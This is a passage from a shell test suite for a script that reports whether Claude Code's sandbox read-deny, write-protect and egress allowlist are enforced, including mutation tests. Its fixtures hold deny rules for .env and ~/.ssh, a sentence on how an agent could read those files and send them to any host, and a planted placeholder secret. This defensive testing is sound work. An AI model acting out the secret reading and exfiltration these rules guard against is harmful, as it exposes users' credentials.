      PREFLIGHT_BOUNDARY_OPTOUT="${7:-@absent}"; export PREFLIGHT_BOUNDARY_OPTOUT   # no real origin read: the declaration is a fixture file or a state word
      PREFLIGHT_SANDBOX_OS="${6:-Darwin}"; PREFLIGHT_SANDBOX_TOOLS="sandbox-exec"; PREFLIGHT_SANDBOX_BWRAP_OK=1   # the sandbox CAN start unless a cell says Plan9
      export PREFLIGHT_SANDBOX_OS PREFLIGHT_SANDBOX_TOOLS PREFLIGHT_SANDBOX_BWRAP_OK
      if [ "${5:-}" = runtime ]; then SANDBOX_RUNTIME=1; export SANDBOX_RUNTIME; fi
      if [ "${5:-}" = ci ]; then CI=true; GITHUB_ACTIONS=true; export CI GITHUB_ACTIONS; fi
      check_boundary 2>&1 )
  }
  bnd_has() {  # <label> <substring>
    case "$out" in *"$2"*) echo "PASS: boundary [$1] prints '$2'" ;; *) echo "FAIL: boundary [$1] did not print '$2' ($out)"; fail=1 ;; esac
  }
  bnd_no() {  # <label> <substring>
    case "$out" in *"$2"*) echo "FAIL: boundary [$1] printed '$2' ($out)"; fail=1 ;; *) echo "PASS: boundary [$1] does not print '$2'" ;; esac
  }
  bnd_case "$_bnd/full.json" "" "$_bnd/user-strict.json"
  bnd_has on-user-strict 'ok   boundary: ON [static] — read-deny: ON, write-protect: ON'
  bnd_has on-user-strict 'egress: ENFORCED'
  bnd_no on-user-strict 'NOT ENFORCED'
  bnd_has on-user-strict 'web: WebFetch denied; read pages with sh scripts/fetch-text.sh'
  bnd_no on-user-strict 'PLANTEDSECRET'
  _bnd_plain="$out"
  # INVERTED by SWAS-355 (r1, L2): the CI run no longer prints what the cleared run prints. It reads the committed project block only and says so.
  bnd_case "$_bnd/full.json" "" "$_bnd/user-strict.json" "" ci
  if [ "$out" != "$_bnd_plain" ]; then echo "PASS: boundary the CI=true run differs from the cleared run (the line keys on CI: the declared tier)"; else echo "FAIL: boundary CI=true printed exactly what the cleared run prints"; fail=1; fi
  bnd_has ci-declared-tier 'ok   boundary: ON [declared] (CI set: local and user scopes not read)'
  bnd_no ci-declared-tier '[static]'
  bnd_has ci-declared-tier 'egress: N/A [declared]'
  bnd_no ci-declared-tier 'egress: ENFORCED'
  bnd_case "$_bnd/full.json" "" "$_bnd/user-plain.json"
  bnd_has user-without-strict 'FAIL egress: NOT ENFORCED and UNDECLARED [static] — strictAllowlist is not set at user or managed scope'
  bnd_no user-without-strict 'PLANTEDSECRET'
  bnd_case "$_bnd/full.json"
  bnd_has user-absent 'FAIL egress: NOT ENFORCED'
  bnd_case "$_bnd/strictproj.json"
  bnd_has strict-only-in-the-repo-file 'FAIL egress: NOT ENFORCED'
  bnd_has strict-only-in-the-repo-file 'ignored by Claude Code'
  bnd_case "$_bnd/full.json" "" "" "$_bnd/user-strict.json"
  bnd_has strict-at-managed-scope 'egress: ENFORCED'
  bnd_case "$_bnd/full.json" "$_bnd/off.json"
  bnd_has local-off-beats-project-on 'FAIL boundary: OFF'
  bnd_no local-off-beats-project-on 'egress:'
  bnd_case "$_bnd/off.json"
  bnd_has project-off 'FAIL boundary: OFF'
  bnd_case "$_bnd/noblock.json"
  bnd_has no-sandbox-block 'FAIL boundary: OFF'
  bnd_case "$_bnd/noread.json"
  bnd_has on-without-read-deny 'FAIL boundary: PARTIAL'
  bnd_has on-without-read-deny 'read-deny: OFF'
  bnd_case "$_bnd/shortwrite.json"
  bnd_has on-with-project-write-only 'FAIL boundary: PARTIAL'
  bnd_has on-with-project-write-only 'write-protect: PARTIAL'
  bnd_case "$_bnd/full.json" "" "$_bnd/user-strict.json" "" runtime
  bnd_has in-session-user-scope 'warn egress: UNVERIFIED'
  bnd_no in-session-user-scope 'egress: ENFORCED'
  bnd_no in-session-user-scope 'PLANTEDSECRET'
  bnd_has in-session-user-scope 'is unreadable here'
  bnd_case "/nonexistent-project" "" "$_bnd/user-plain.json" "" runtime
  bnd_has in-session-nothing-else-decides 'warn boundary: UNVERIFIED'
  bnd_no in-session-nothing-else-decides 'PLANTEDSECRET'
  # The settings enable the sandbox but it cannot start here (Claude Code then runs without it): never ON.
  bnd_case "$_bnd/full.json" "" "$_bnd/user-strict.json" "" "" Plan9
  bnd_has sandbox-cannot-start 'FAIL boundary: OFF (cannot start:'
  bnd_no sandbox-cannot-start 'boundary: ON'
  # A local file is part of the merge: an allowRead that names more than the two templates shadows the read-deny; allowUnsandboxedCommands opts commands out.
  printf '{"sandbox":{"filesystem":{"allowRead":["**/.env"]}}}\n' > "$_bnd/local-shadow.json"
  printf '{"sandbox":{"allowUnsandboxedCommands":true}}\n' > "$_bnd/local-unsandboxed.json"
  printf '{"sandbox":{"filesystem":{"allowRead":["**/.env.example","**/.env.sample"]}}}\n' > "$_bnd/local-templates.json"
  bnd_case "$_bnd/full.json" "$_bnd/local-shadow.json" "$_bnd/user-strict.json"
  bnd_has local-allowread-shadows 'FAIL boundary: PARTIAL'
  bnd_has local-allowread-shadows 'read-deny: SHADOWED'
  bnd_case "$_bnd/full.json" "$_bnd/local-unsandboxed.json" "$_bnd/user-strict.json"
  bnd_has local-unsandboxed-commands 'FAIL boundary: PARTIAL'
  bnd_has local-unsandboxed-commands 'allowUnsandboxedCommands is true'
  # A file jq reads but JSON.parse refuses (a BOM, a NaN literal) is UNVERIFIED in its scope, never ON.
  printf '\357\273\277{"sandbox":{"enabled":true}}\n' > "$_bnd/bom.json"
  printf '{"sandbox":{"enabled":true,"zz":nan}}\n' > "$_bnd/nan.json"
  bnd_case "$_bnd/bom.json"
  bnd_has bom-project-file 'warn boundary: UNVERIFIED'
  bnd_no bom-project-file 'boundary: ON'
  bnd_case "$_bnd/nan.json"
  bnd_has nan-project-file 'warn boundary: UNVERIFIED'
  # A byte below 0x20 (a NUL) is UNVERIFIED, never ON: BSD awk would truncate at it and jq reads past it. A present allowRead that is not a list is SHADOWED.
  printf '{"sandbox":{"enabled":true}}\n\000' > "$_bnd/nul-trailing.json"
  printf '{"sandbox":{"enabled":true,"filesystem":{"denyRead":["**/.env","~/.ssh"],"denyWrite":["./.claude","~/.claude/settings.json"],"allowRead":"**/.env"}}}\n' > "$_bnd/allowread-string.json"
  bnd_case "$_bnd/nul-trailing.json"
  bnd_has nul-project-file 'warn boundary: UNVERIFIED'
  bnd_no nul-project-file 'boundary: ON'
  bnd_case "$_bnd/allowread-string.json"
  bnd_has allowread-not-a-list 'read-deny: SHADOWED'
  # A value Claude Code might coerce to true ("true", 1) counts as set: only false or absent is safe.
  printf '{"sandbox":{"allowUnsandboxedCommands":"true"}}\n' > "$_bnd/local-unsandboxed-str.json"
  bnd_case "$_bnd/full.json" "$_bnd/local-unsandboxed-str.json" "$_bnd/user-strict.json"
  bnd_has local-unsandboxed-string 'allowUnsandboxedCommands is true'
  bnd_case "$_bnd/full.json" "$_bnd/local-templates.json" "$_bnd/user-strict.json"
  bnd_has local-allowread-templates-only 'ok   boundary: ON [static]'
  # An unreadable user file (mode 000) reads UNVERIFIED too. Skipped where the file stays readable (root).
  printf '{"sandbox":{"network":{"strictAllowlist":true}}}\n' > "$_bnd/user-locked.json"; chmod 000 "$_bnd/user-locked.json"
  if cat "$_bnd/user-locked.json" >/dev/null 2>&1; then
    echo "PASS: boundary [mode-000 user file] skipped (the file is readable here, as root)"
  else
    bnd_case "$_bnd/full.json" "" "$_bnd/user-locked.json"
    bnd_has mode-000-user-file 'warn egress: UNVERIFIED'
    bnd_no mode-000-user-file 'egress: ENFORCED'
  fi
  chmod 600 "$_bnd/user-locked.json"
  # The line is information only: it never sets `miss` or `rec`, so the exit code does not move.
  miss=0; rec=0
  PREFLIGHT_SANDBOX_SETTINGS="$_bnd/off.json" PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local PREFLIGHT_SANDBOX_USER=/nonexistent-user PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed check_boundary >/dev/null 2>&1
  PREFLIGHT_SANDBOX_SETTINGS="$_bnd/full.json" PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local PREFLIGHT_SANDBOX_USER=/nonexistent-user PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed check_boundary >/dev/null 2>&1
  unset PREFLIGHT_SANDBOX_SETTINGS PREFLIGHT_SANDBOX_LOCAL PREFLIGHT_SANDBOX_USER PREFLIGHT_SANDBOX_MANAGED
  if [ "$miss" -eq 0 ] && [ "$rec" -eq 0 ]; then echo "PASS: boundary lines (OFF and NOT ENFORCED) leave miss and rec untouched"; else echo "FAIL: a boundary line set miss or rec (the check must stay information only)"; fail=1; fi
  miss=0; rec=0
  # WIRED: a real run (seams live, CI and the session marker cleared) prints the line, so a defined-but-uncalled check cannot pass.
  _bnd_e2e() {  # <project> <user> [env-assignment] [script]: the real body past the boundary call; prints its output
    # shellcheck disable=SC2086  # deliberate word-split: ${3:-...} is one NAME=value word
    env -u CI -u GITHUB_ACTIONS -u SANDBOX_RUNTIME ${3:-KIT_UNUSED=1} PREFLIGHT_SANDBOX_SETTINGS="$1" PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local PREFLIGHT_SANDBOX_USER="$2" PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed PREFLIGHT_SANDBOX_OS="${5:-Darwin}" PREFLIGHT_SANDBOX_TOOLS=sandbox-exec PREFLIGHT_BOUNDARY_OPTOUT=@absent PREFLIGHT_SANDBOX_BWRAP_OK=1 PREFLIGHT_GH_CMD=false ACTIONLINT_VALID_CMD=__skip__ sh "${4:-$0}" --selftest-e2e --boundary-advisory 2>&1 || true
  }
  out=$(_bnd_e2e "$_bnd/full.json" "$_bnd/user-plain.json")
  bnd_has wired-into-the-real-run 'boundary: ON [static]'
  bnd_has wired-into-the-real-run 'egress: NOT ENFORCED'
  # Load-bearing mutants: a sed mutation of a TEMP COPY; the copy must stop printing what the original prints, and the mutation MUST apply.
  _bnd_mut() {  # <name> <sed expr> <project> <user> <runtime-env or ""> <substring the ORIGINAL prints>
    _bm=$(mktemp -d)
    sed "$2" "$0" > "$_bm/preflight.sh"; cp "$(dirname -- "$0")/incept.sh" "$_bm/incept.sh"   # SWAS-784: the copy reads the marker list from the incept.sh beside it
    if cmp -s "$0" "$_bm/preflight.sh"; then echo "FAIL: mutant $1 did not apply (the sed expression matched nothing)"; fail=1; rm -rf "$_bm"; return 0; fi
    _bm_o=$(_bnd_e2e "$3" "$4" "$5" "$_bm/preflight.sh" "${7:-Darwin}")
    case "$_bm_o" in *"Recommended (GitHub-based flows"*) : ;; *) echo "FAIL: mutant $1 never ran the real body past the boundary call (vacuous)"; fail=1 ;; esac
    case "$_bm_o" in *"$6"*) echo "FAIL: mutant $1 survived (it still prints '$6')"; fail=1 ;; *) echo "PASS: mutant $1 is killed" ;; esac
    rm -rf "$_bm"
  }
  _bnd_mut boundary-uncalled 's/^check_boundary$/:/' "$_bnd/full.json" "$_bnd/user-plain.json" "" 'boundary: ON [static]'
  _bnd_mut strict-from-repo-file '/MUT-STRICT-SCOPE/s/managed|user) _bst=1 ;; \*) _bstrepo=1 ;;/managed|user|project|local) _bst=1 ;; *) _bstrepo=1 ;;/' "$_bnd/strictproj.json" "/nonexistent-user" "" 'egress: NOT ENFORCED'
  _bnd_mut in-session-marker-removed '/MUT-INSESSION/s/if \[ "\$_bn" = user \] && \[ -n "[^"]*" \]; then/if false; then/' "$_bnd/full.json" "$_bnd/user-strict.json" "SANDBOX_RUNTIME=1" 'egress: UNVERIFIED'
  _bnd_mut web-line-dropped '/MUT-WEBLINE/s/echo "  ok   web:[^"]*"/:/' "$_bnd/full.json" "$_bnd/user-plain.json" "" 'web: WebFetch denied'
  _bnd_mut strict-json-check-neutered 's/END { exit bad }/END { exit 0 }/' "$_bnd/nan.json" "$_bnd/user-plain.json" "" 'boundary: UNVERIFIED'
  # (the awk token test is neutered too: gawk keeps a NUL in the record and would still refuse the file, BSD awk truncates at it)
  # The NUL check is load-bearing only where jq itself accepts the fixture (macOS jq does; a Linux jq may refuse a trailing NUL, and then the file reads
  # UNVERIFIED with the check neutered too, so the mutant cannot show anything). Labelled, not hidden.
  if jq -e . "$_bnd/nul-trailing.json" >/dev/null 2>&1; then
    _bnd_mut nul-check-neutered '/LC_ALL=C tr -d/s/= 0 \] || { echo unreadable; return 0; }/= 0 ] || :/;s/END { exit bad }/END { exit 0 }/' "$_bnd/nul-trailing.json" "$_bnd/user-plain.json" "" 'boundary: UNVERIFIED'
  else
    echo "PASS: mutant nul-check-neutered not applicable on this jq (it refuses a trailing NUL itself, so the file reads UNVERIFIED without the check); the replacement is the jq-partial-output cells below, which run on every platform"
  fi
  # A jq that prints a partial object and then exits non-zero (what a Linux jq 1.7 does on a trailing NUL) must read as ONE line, unreadable, never as a pass and never as
  # two lines (the old `|| echo unreadable` streamed both, and the caller's second jq aborted the run under set -eu). A PATH-stub jq makes this testable on every platform.
  _bnd_stub=$(mktemp -d); _bnd_realjq=$(command -v jq)
  { printf '#!/bin/sh\n'; printf 'case "$*" in *strictAllowlist*) echo "{\\"e\\":\\"true\\"}"; exit 2 ;; esac\n'; printf 'exec %s "$@"\n' "$_bnd_realjq"; } > "$_bnd_stub/jq"
  chmod +x "$_bnd_stub/jq"
  out=$( PATH="$_bnd_stub:$PATH"; export PATH; boundary_read_scope "$_bnd/full.json" )
  if [ "$out" = unreadable ]; then echo "PASS: boundary [jq-partial-output-scope] a jq that prints a partial object then fails reads as exactly one line: unreadable"; else echo "FAIL: boundary [jq-partial-output-scope] expected exactly 'unreadable' ($out)"; fail=1; fi
  out=$( unset CI GITHUB_ACTIONS SANDBOX_RUNTIME
    PATH="$_bnd_stub:$PATH"; export PATH
    PREFLIGHT_SANDBOX_SETTINGS="$_bnd/full.json"; PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local; PREFLIGHT_SANDBOX_USER=/nonexistent-user; PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed
    export PREFLIGHT_SANDBOX_SETTINGS PREFLIGHT_SANDBOX_LOCAL PREFLIGHT_SANDBOX_USER PREFLIGHT_SANDBOX_MANAGED
    PREFLIGHT_SANDBOX_OS=Darwin; PREFLIGHT_SANDBOX_TOOLS=sandbox-exec; PREFLIGHT_SANDBOX_BWRAP_OK=1; export PREFLIGHT_SANDBOX_OS PREFLIGHT_SANDBOX_TOOLS PREFLIGHT_SANDBOX_BWRAP_OK
    check_boundary 2>&1 )
  bnd_has jq-partial-output-line 'boundary: UNVERIFIED'
  bnd_no jq-partial-output-line 'boundary: ON'
  if [ "$(printf '%s\n' "$out" | grep -c 'boundary:')" -eq 1 ]; then echo "PASS: boundary [jq-partial-output-line] exactly one boundary line"; else echo "FAIL: boundary [jq-partial-output-line] expected exactly one boundary line ($out)"; fail=1; fi
  out=$( PATH="$_bnd_stub:$PATH"; export PATH; _bnd_e2e "$_bnd/full.json" "$_bnd/user-plain.json" )   # PATH exported, never word-split into env (a PATH entry may hold a space)
  bnd_has jq-partial-output-real-run 'Recommended (GitHub-based flows'
  bnd_has jq-partial-output-real-run 'boundary: UNVERIFIED'
  # The same two-line crash was reachable on EVERY platform, with the REAL jq (no stub): a file with trailing garbage passes the tr and awk pre-checks, and
  # jq prints the object and then exits non-zero on the stray bracket. It must read as one unreadable line, never ON.
  printf '{"a":1} ]\n' > "$_bnd/trailing-garbage.json"
  out=$( boundary_read_scope "$_bnd/trailing-garbage.json" )
  if [ "$out" = unreadable ]; then echo "PASS: boundary [trailing-garbage-real-jq-scope] a file with trailing garbage reads as exactly one line: unreadable (real jq)"; else echo "FAIL: boundary [trailing-garbage-real-jq-scope] expected exactly 'unreadable' ($out)"; fail=1; fi
  bnd_case "$_bnd/trailing-garbage.json"
  bnd_has trailing-garbage-real-jq 'boundary: UNVERIFIED'
  bnd_no trailing-garbage-real-jq 'boundary: ON'
  if [ "$(printf '%s\n' "$out" | grep -c 'boundary:')" -eq 1 ]; then echo "PASS: boundary [trailing-garbage-real-jq] exactly one boundary line"; else echo "FAIL: boundary [trailing-garbage-real-jq] expected exactly one boundary line ($out)"; fail=1; fi
  # The mutant restores the old streaming (`|| echo unreadable` inside the capture): the run must lose the body (it aborts), which is how the real crash showed.
  _bm=$(mktemp -d)
  sed 's/}'"'"' "\$1" 2>\/dev\/null) || { echo unreadable; return 0; }/}'"'"' "$1" 2>\/dev\/null || echo unreadable)/;/in   # MUT-ONEDOC$/,/^  esac$/d' "$0" > "$_bm/preflight.sh"   # the one-document check would also catch the streamed pair, so the mutant removes it too
  if cmp -s "$0" "$_bm/preflight.sh"; then echo "FAIL: mutant jq-streams-partial-output did not apply (the sed expression matched nothing)"; fail=1
  elif ! sh -n "$_bm/preflight.sh" 2>/dev/null; then echo "FAIL: mutant jq-streams-partial-output does not parse (a mutant that cannot run would read as killed)"; fail=1
  else
    _bm_o=$( PATH="$_bnd_stub:$PATH"; export PATH; _bnd_e2e "$_bnd/full.json" "$_bnd/user-plain.json" "" "$_bm/preflight.sh" )
    case "$_bm_o" in *"Recommended (GitHub-based flows"*) echo "FAIL: mutant jq-streams-partial-output survived (the run still reaches the body)"; fail=1 ;; *) echo "PASS: mutant jq-streams-partial-output is killed (the restored streaming aborts the run)" ;; esac
  fi
  rm -rf "$_bm" "$_bnd_stub"
  # A CI=true run with HOME at an empty directory (no ~/.claude) and the user scope at a nonexistent seam must reach the body past the boundary call.
  _bnd_home=$(mktemp -d)
  out=$(env -u GITHUB_ACTIONS -u SANDBOX_RUNTIME CI=true HOME="$_bnd_home" PREFLIGHT_SANDBOX_SETTINGS="$_bnd/full.json" PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local PREFLIGHT_SANDBOX_USER=/nonexistent-user PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed PREFLIGHT_SANDBOX_OS=Darwin PREFLIGHT_SANDBOX_TOOLS=sandbox-exec PREFLIGHT_SANDBOX_BWRAP_OK=1 PREFLIGHT_GH_CMD=false ACTIONLINT_VALID_CMD=__skip__ sh "$0" --selftest-e2e --boundary-advisory 2>&1 || true)
  rm -rf "$_bnd_home"
  bnd_has ci-true-empty-home-reaches-the-body 'Recommended (GitHub-based flows'
  bnd_has ci-true-empty-home-reaches-the-body 'boundary: ON [declared]'
  bnd_no ci-true-empty-home-reaches-the-body 'boundary: ON [static]'
  _bnd_mut cannot-start-ignored '/MUT-CANTSTART/s/if \[ "\$_bci" -eq 0 \] \&\& ! _bwhy=\$(sandbox_unavailable_reason); then/if false; then/' "$_bnd/full.json" "$_bnd/user-plain.json" "" 'boundary: OFF (cannot start:' Plan9
  # ==== SWAS-355 (355a): the opt-out declaration, bfail, --boundary-advisory, the legs, DC20 ================================================================
  # Fixtures only: the origin read is the PREFLIGHT_BOUNDARY_OPTOUT seam (a fixture file, @absent, @nonregular or @unreadable) except in the cells that drive the
  # REAL reader against a local bare repository. No network, no real home. Every cell clears CI, GITHUB_ACTIONS and SANDBOX_RUNTIME (bnd_case, _bnd_run).
  _dl='an agent can read .env and ~/.ssh through an interpreter and send them to any host'
  printf '%s\n' "part=all reason=maintainers pull control-plane changes several times a day lost=$_dl since=2026-10-23" > "$_bnd/d-all.conf"
  printf '%s\n' "part=egress reason=ok lost=an unlisted host is a prompt since=2026-10-23" > "$_bnd/d-egress.conf"
  printf '%s\n' "part=read-deny reason=ok lost=env files are readable since=2026-10-23" > "$_bnd/d-rd.conf"
  printf '%s\n' "part=write-protect reason=ok lost=home files are writable since=2026-10-23" > "$_bnd/d-wp.conf"
  printf '%s\n' "part=read-deny reason=r lost=l since=2026-10-23" "part=write-protect reason=r lost=l since=2026-10-23" "part=egress reason=r lost=l since=2026-10-23" > "$_bnd/d-three.conf"
  printf '# the declaration\n\npart=all reason=r lost=l since=2026-10-23\n' > "$_bnd/d-comment.conf"
  # 1 / 2: an OFF sandbox. Declared: loud, with the date and the Lost text. Undeclared: the one state that FAILS.
  bnd_case "$_bnd/off.json" "" "" "" "" "" "$_bnd/d-all.conf"
  bnd_has declared-off 'WARN boundary: OFF [static] (opted out 2026-10-23, declared in .kit/boundary-optout.conf). Lost: an agent can read .env'
  bnd_no declared-off 'UNDECLARED'
  bnd_no declared-off 'FAIL boundary: OFF [static] (opted out'
  bnd_no declared-off '(kit: an agent can read .env'   # the repo's lost= sentence equals the kit's own: printed once, no duplicate "(kit: ...)"
  bnd_case "$_bnd/off.json"
  bnd_has undeclared-off 'FAIL boundary: OFF and UNDECLARED [static]'
  bnd_has undeclared-off 'Fix: declare it in .kit/boundary-optout.conf (part=all), or remove the override that turns it off'
  bnd_case "$_bnd/off.json" "" "" "" "" "" "$_bnd/d-egress.conf"
  bnd_has off-needs-every-part 'OFF and UNDECLARED'
  bnd_case "$_bnd/off.json" "" "" "" "" "" "$_bnd/d-three.conf"
  bnd_has off-declared-by-three-parts 'WARN boundary: OFF [static] (opted out 2026-10-23'
  # 3: PARTIAL needs its own part.
  bnd_case "$_bnd/shortwrite.json" "" "$_bnd/user-strict.json"
  bnd_has partial-undeclared 'FAIL boundary: PARTIAL and UNDECLARED [static]'
  bnd_has partial-undeclared '(part=write-protect)'
  bnd_case "$_bnd/shortwrite.json" "" "$_bnd/user-strict.json" "" "" "" "$_bnd/d-wp.conf"
  bnd_has partial-declared 'WARN boundary: PARTIAL [static] (opted out 2026-10-23, declared in .kit/boundary-optout.conf)'
  bnd_case "$_bnd/shortwrite.json" "" "$_bnd/user-strict.json" "" "" "" "$_bnd/d-rd.conf"
  bnd_has partial-wrong-part-declared 'PARTIAL and UNDECLARED'
  bnd_case "$_bnd/noread.json" "" "$_bnd/user-strict.json" "" "" "" "$_bnd/d-rd.conf"
  bnd_has partial-read-deny-declared 'WARN boundary: PARTIAL [static] (opted out'
  bnd_case "$_bnd/full.json" "$_bnd/local-unsandboxed.json" "$_bnd/user-strict.json" "" "" "" "$_bnd/d-rd.conf"
  bnd_has unsandboxed-commands-need-part-all 'PARTIAL and UNDECLARED'
  bnd_case "$_bnd/full.json" "$_bnd/local-unsandboxed.json" "$_bnd/user-strict.json" "" "" "" "$_bnd/d-all.conf"
  bnd_has unsandboxed-commands-declared-by-all 'WARN boundary: PARTIAL [static] (opted out'
  # 4: the sandbox cannot start (DC10): every part is off, only part=all (or all three parts) declares it.
  bnd_case "$_bnd/full.json" "" "$_bnd/user-strict.json" "" "" Plan9
  bnd_has cannot-start-undeclared 'FAIL boundary: OFF (cannot start:'
  bnd_has cannot-start-undeclared ') and UNDECLARED [static]'
  bnd_case "$_bnd/full.json" "" "$_bnd/user-strict.json" "" "" Plan9 "$_bnd/d-rd.conf"
  bnd_has cannot-start-one-part-is-not-enough 'and UNDECLARED'
  bnd_case "$_bnd/full.json" "" "$_bnd/user-strict.json" "" "" Plan9 "$_bnd/d-all.conf"
  bnd_has cannot-start-declared-by-all '[static] (opted out 2026-10-23, declared in'
  bnd_no cannot-start-declared-by-all 'UNDECLARED'
  # 5: egress. Undeclared names the user-level act FIRST and the declaration second (L3); declared is loud; in a session it is UNVERIFIED with no judgement.
  out=$( cd "$_bnd" || exit 1; bnd_case "$_bnd/full.json" "" "$_bnd/user-plain.json"; printf '%s' "$out" )   # SWAS-474 R3: from a directory with no .kit/tracker.conf, so a FAIL dump never carries the kit's own tracker host
  bnd_has egress-undeclared 'FAIL egress: NOT ENFORCED and UNDECLARED [static]'
  case "$out" in
    *"Fix: (1) merge the user-level block into ~/.claude/settings.json (the block is printed on the lines below, with the hosts to review, or why none could be listed;"*"(2) to opt out on purpose, commit part=egress to .kit/boundary-optout.conf"*) echo "PASS: boundary [egress-fix-order] the fix names the user-level act first and the declaration second" ;;   # SWAS-474: the fix line no longer carries the block; it points at the lines below
    *) echo "FAIL: boundary [egress-fix-order] the egress fix text is not (1) the user-level act, (2) the declaration ($out)"; fail=1 ;;
  esac
  bnd_no egress-fix-no-placeholder '<the hosts you use>'   # SWAS-474: the old inline block carried a placeholder and was not valid JSON
  bnd_case "$_bnd/full.json" "" "$_bnd/user-plain.json" "" "" "" "$_bnd/d-egress.conf"
  bnd_has egress-declared 'WARN egress: NOT ENFORCED [static] (opted out 2026-10-23, declared in .kit/boundary-optout.conf). Lost: an unlisted host is a prompt (kit: '   # a lost= sentence that differs from the kit's keeps the "(kit: ...)" suffix
  bnd_no egress-declared 'UNDECLARED'
  bnd_case "$_bnd/full.json" "" "$_bnd/user-plain.json" "" "" "" "$_bnd/d-rd.conf"
  bnd_has egress-not-declared-by-another-part 'egress: NOT ENFORCED and UNDECLARED'
  bnd_case "$_bnd/full.json" "" "$_bnd/user-plain.json" "" runtime
  bnd_has egress-in-session 'warn egress: UNVERIFIED [static, agent-reported]'
  bnd_no egress-in-session 'UNDECLARED'
  bnd_no egress-in-session 'FAIL egress'
  # 7 / 8: a malformed declaration is fail closed: the line number and the rule, never the text, and NO part counts as declared (a good first line declares nothing).
  _mk() {  # <name> <printf format> [args]: writes a malformed fixture
    _mkn=$1; shift; printf "$@" > "$_bnd/m-$_mkn.conf"
  }
  _mk eq 'part=all reason=leakword=x lost=l since=2026-10-23\n'
  _mk order 'part=all lost=l reason=leakword since=2026-10-23\n'
  _mk unknown 'part=bogus reason=leakword lost=l since=2026-10-23\n'
  _mk dup 'part=egress reason=r lost=l since=2026-10-23\npart=egress reason=leakword lost=l since=2026-10-23\n'
  _mk allplus 'part=all reason=r lost=l since=2026-10-23\npart=egress reason=leakword lost=l since=2026-10-23\n'
  _mk future 'part=all reason=leakword lost=l since=2999-01-01\n'
  _mk cr 'part=all reason=leakword lost=l since=2026-10-23\r\n'
  _mk long 'part=all reason=leakword%0600d lost=l since=2026-10-23\n' 0
  _mk baddate 'part=all reason=leakword lost=l since=2026-02-30\n'
  _mk partial 'part=all reason=r lost=l since=2026-10-23\npart=bogus reason=leakword lost=l since=2026-10-23\n'
  for _mm in 'eq|line 1: a value contains' 'order|line 1: the fields must be' 'unknown|line 1: an unknown part' 'dup|line 2: part appears twice' 'allplus|part=all appears with another part' 'future|line 1: since is not a real date' 'cr|a control byte, a CR' 'long|line 1: a line is over 512 bytes' 'baddate|line 1: since is not a real date' 'partial|line 2: an unknown part'; do
    bnd_case "$_bnd/off.json" "" "" "" "" "" "$_bnd/m-${_mm%%|*}.conf"
    bnd_has "malformed-${_mm%%|*}" "FAIL boundary: declaration MALFORMED (.kit/boundary-optout.conf"
    bnd_has "malformed-${_mm%%|*}" "${_mm#*|}"
    bnd_has "malformed-${_mm%%|*}" 'OFF and UNDECLARED'
    bnd_no "malformed-${_mm%%|*}" 'leakword'
  done
  bnd_case "$_bnd/off.json" "" "" "" "" "" "$_bnd/d-comment.conf"
  bnd_has comment-and-blank-lines-accepted '(opted out 2026-10-23, declared in .kit/boundary-optout.conf)'
  bnd_no comment-and-blank-lines-accepted 'MALFORMED'
  # 10: an unreadable declaration (no origin, offline, an SSH remote in a session, an unfetched tip) is never a pass and is not UNDECLARED.
  bnd_case "$_bnd/off.json" "" "" "" "" "" "@unreadable"
  bnd_has declaration-unreadable 'FAIL boundary: OFF, declaration UNVERIFIED [static] (could not read .kit/boundary-optout.conf on origin'
  bnd_no declaration-unreadable 'UNDECLARED'
  # 34: an origin entry that is not a regular file (a symlink, a gitlink, a directory) is MALFORMED, never absent.
  bnd_case "$_bnd/off.json" "" "" "" "" "" "@nonregular"
  bnd_has declaration-not-a-regular-file 'declaration MALFORMED (.kit/boundary-optout.conf: the entry on origin'"'"'s default branch is not a regular file)'
  bnd_has declaration-not-a-regular-file 'OFF and UNDECLARED'
  # 35: the read is bounded: more than 4 records, or over 4 KiB.
  printf '%s\n' "part=read-deny reason=r lost=l since=2026-10-23" "part=write-protect reason=r lost=l since=2026-10-23" "part=egress reason=r lost=l since=2026-10-23" "part=all reason=r lost=l since=2026-10-23" "part=egress reason=r lost=l since=2026-10-23" > "$_bnd/m-five.conf"
  bnd_case "$_bnd/off.json" "" "" "" "" "" "$_bnd/m-five.conf"
  bnd_has record-cap 'line 5: more than 4 records'
  { printf '# '; head -c 4100 /dev/zero | tr '\0' 'x'; printf '\npart=all reason=r lost=l since=2026-10-23\n'; } > "$_bnd/m-big.conf"
  bnd_case "$_bnd/off.json" "" "" "" "" "" "$_bnd/m-big.conf"
  bnd_has size-cap 'the file is over 4 KiB'
  # 9: (the working-tree cell that stood here was vacuous: it ran under a seam that never reads a working tree. The real cell is `working-tree-ignored` below.)
  # 11: the CI declared tier: only the committed project block is read; a local or managed file that turns the sandbox off is not read; the declaration is not read.
  bnd_case "$_bnd/full.json" "$_bnd/off.json" "$_bnd/user-plain.json" "$_bnd/off.json" ci
  bnd_has ci-reads-only-the-project-block 'ok   boundary: ON [declared] (CI set: local and user scopes not read)'
  bnd_case "$_bnd/off.json" "" "" "" ci "" "$_bnd/d-all.conf"
  bnd_has ci-off-is-not-judged-against-a-declaration 'FAIL boundary: OFF [declared] (CI set: local and user scopes not read; the declaration is not read in CI)'
  bnd_no ci-off-is-not-judged-against-a-declaration 'opted out'
  bnd_no ci-off-is-not-judged-against-a-declaration 'UNDECLARED'
  # 13 / 14: DC7 (no non-boundary value is emitted) and DC20 (saved WebFetch allows are listed; a host only after the grammar; a token-shaped entry is counted, never printed).
  printf '{"env":{"KIT_TRACKER_TOKEN":"kit-PLANTEDSECRET-placeholder-token"},"permissions":{"allow":["WebFetch(domain:example.org)"]}}\n' > "$_bnd/local-wf1.json"
  printf '{"permissions":{"allow":["WebFetch(domain:example.org)","WebFetch(domain:UPPER.COM)","WebFetch(domain:1.2.3.4)","WebFetch(domain:kit-PLANTEDSECRET-placeholder-token)","Bash(ls)"]}}\n' > "$_bnd/local-wf4.json"
  bnd_case "$_bnd/full.json" "$_bnd/local-wf1.json" "$_bnd/user-plain.json"
